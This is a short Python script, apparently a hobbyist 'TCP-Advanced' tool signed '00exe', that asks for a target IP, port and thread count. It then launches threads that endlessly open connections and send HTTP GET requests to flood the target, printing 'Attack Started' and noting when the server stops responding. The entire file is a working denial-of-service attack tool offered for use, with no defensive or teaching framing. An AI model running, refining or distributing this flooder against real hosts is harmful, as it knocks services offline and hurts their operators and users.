import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

print("\033[91m")
os.system("clear")
os.system("figlet exe-TCP-Advanced")
print("")
print("Coded By : 00exe")
print("")

ip = input("IP Target : ")
port = int(input("Port      : "))
thread_sayisi = int(input("Threads (Recommended: 5 or 10): "))

os.system("clear")
print("\033[93m")
os.system("figlet Attack Started")
print("\033[92m")

sent = 0
lock = threading.Lock()

def saldiri_fonksiyonu():
    global sent
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            
            sock.connect((ip, port))
            
            payload = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            sock.send(payload.encode())
            
            lock.acquire()
            sent += 1
            if sent % 100 == 0:
                print(f"\033[92m[+] Total {sent} requests successfully sent.\033[0m")
            lock.release()
            
            sock.close()
            
        except socket.error:
            lock.acquire()
            sent += 1
            if sent % 50 == 0:
                print("\033[91m[!] Server stopped responding or port is blocked!\033[92m")
            lock.release()
            time.sleep(0.1)

for i in range(thread_sayisi):
    t = threading.Thread(target=saldiri_fonksiyonu)
    t.daemon = True
    t.start()

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[91m[-] Attack stopped by user.\033[0m")
        sys.exit()
